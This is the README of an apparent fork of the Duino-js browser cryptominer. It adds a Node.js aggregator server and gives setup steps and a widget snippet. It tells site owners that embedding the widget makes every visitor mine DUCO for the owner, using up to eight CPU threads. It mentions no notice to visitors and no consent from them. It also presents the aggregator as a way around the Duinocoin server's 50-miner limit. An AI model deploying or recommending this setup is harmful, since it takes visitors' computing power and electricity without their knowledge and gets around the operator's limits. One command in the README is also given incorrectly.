This is a fork of https://github.com/sys-256/Duino-js,(made by Hoiboy19) under MIT licence.

I've added a node.js server, that serve as the client to all webminers , in this case the website visitors. The worker then choose the 40 best ashes of them, and send the transactions to the Duino server, allowing the use of the Duino-js webminer on your website, without overpassing the miners number limit (50 max) fixed on the Duinocoin server.(https://wallet.duinocoin.com/)


## Usage

To use the miner:

-You must have node and npm installed on your server.(see https://docs.npmjs.com/downloading-and-installing-node-js-and-npm)

-change "your duinocoin username" and "webaggregator" in the "index.html", "duino-js.js" and "server.js" file to your wishes.

-Download all the files to your server folder (call it "duinocoin" for example). In this folder, open your terminal, and type :
" openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout selfsigned.key -out selfsigned.crt", that will install a self signed certificate for SSL connection to your websocket server.

-In the same folder("duinocoin",) run "npm install", to get all dependencies installed. The run "npm install ws net" , to be sure to have websocket server installed on your node server.

-Then test, by running "npm server.js". You should see the indications that ther server is running on port :8443:

"bash-5.1$ node server.js
WebSocket server is listening on port 8443
HTTPS server is listening on port 8443
Initializing 40 connections to Duinocoin server...
"

- Navigate to "http://yourserver.com/duinocoin", and you should see a widget showing your DUCO username, your DUCO balance, the active miners working for you, the value of your wallet in TRON (TRX) and an approximation of its value in $.

-You can simply use this widget by placing an <iframe> tag pointing to its adress anywhere in your html, and every visitor of this page will then become a miner of your DUCO wallet, and make you rich ! (maybe...)

Or you can use the html to modify it to your needs and place it directly in your website where you want it, by including its initialization parameters :
"    <div id="duco-widget">
            <img src="duino.png" alt="DUCO Widget Logo" class="logo">
            <h3 id="duco-username">Loading...</h3>
            <p>DUCO : <span id="duco-balance" class="neon-text">0</span></p>
            <p>Active Miners: <span id="duco-miners" class="neon-text">0</span></p>
            <p>TRX : <span id="duco-trx" class="neon-text">0</span></p>
            <p>$ : <span id="duco-dollar" class="neon-text">0</span></p>
        </div> 
        
        "<script src="duino-js.js"></script>
        <script>
    const username = `your duinocoin username`; // Put your username here (e.g. revox, cyclotronic or Hoiboy19).
    const rigid = `webaggregator`; // If you want to change the rig ID, you can change this.
    const threads = userThreads; // Set the amount of threads to use here.
    const miningkey = ""; // Put your mining key here. If you haven't set one, replace "test" with null
    startMiner("your duinocoin username", "webaggregator", 2, null, "wss://localhost:8443"); // Start the miner with the given parameters. the wss://localhost:8443 is the default one, you can change it to your own server if you want to.(ip or domain)

    const ducoAPI = `https://server.duinocoin.com/v2/users/${username}`;
    const priceAPI = "https://server.duinocoin.com/api.json";
   (...)
</script>

Note: You need a web server like Apache or NGINX to run it, because Web Workers don't work on local files.

### Options

The `threads` variable is pretty customizable, so here are some examples:

-   `threads = userThreads` --> Uses all the threads of the computer, but if the computer has more then 8 threads, it will still use 8 threads due to profitability.
-   `threads = userThreads/2` --> Divides the userThreads by 2, so it will use 50% of the computers power, but if 50% of the threads is more then 8, it will just use 8.
-   `threads = 4` --> Uses 4 threads for mining, but if the user has less then 4 threads, it will use the amount of threads the user has.
-   `threads = 0` --> You can't use 0 threads, so Duino-JS will set it to 1.
-   `threads = 16` --> Since mining with more then 8 threads isn't profitable, Duino-JS will set threads to 8.


Thanks for letting me experiment, and enjoy the DUCO mining.

It is advised to regulate your mining situation with the DUCO server, by getting verified on the wallet website: send a picture of your widget, with your name and date on a paper visible on it, to the verification form on the duinocon wallet website.(https://wallet.duinocoin.com/)
